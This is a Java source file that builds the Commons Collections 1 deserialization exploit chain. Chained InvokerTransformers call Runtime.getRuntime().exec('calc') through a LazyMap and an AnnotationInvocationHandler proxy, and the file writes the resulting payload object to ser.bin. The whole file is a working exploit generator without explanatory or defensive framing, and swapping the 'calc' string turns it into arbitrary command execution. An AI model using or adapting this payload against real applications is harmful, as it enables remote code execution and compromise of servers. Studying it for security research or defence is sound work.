package org.example;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.map.LazyMap;

import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.Map;
import java.util.HashMap;
import java.lang.reflect.Constructor;
import java.io.*;
public class serialize {
    public static void main(String[] args) throws Exception {
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod"
                        , new Class[]{ String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}),
                new InvokerTransformer("invoke"
                        , new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
                new InvokerTransformer("exec"
                        , new Class[]{String.class}, new Object[]{"calc"})
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        Map hashMap = new HashMap();
        Map <Object,Object> decorate = LazyMap.decorate(hashMap,chainedTransformer );
        final Constructor<?> constructor = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler").getDeclaredConstructors()[0];
        constructor.setAccessible(true);
        InvocationHandler object = (InvocationHandler) constructor.newInstance(Override.class, decorate);

        Proxy mapProxy = (Proxy) Proxy.newProxyInstance(serialize.class.getClassLoader(), new Class[] {Map.class}, object );
        InvocationHandler res = (InvocationHandler) constructor.newInstance(Override.class, mapProxy);
        serialize(res);
    }
    public static void serialize(final Object obj) throws IOException {
        final ObjectOutputStream objOut = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        objOut.writeObject(obj);
    }
}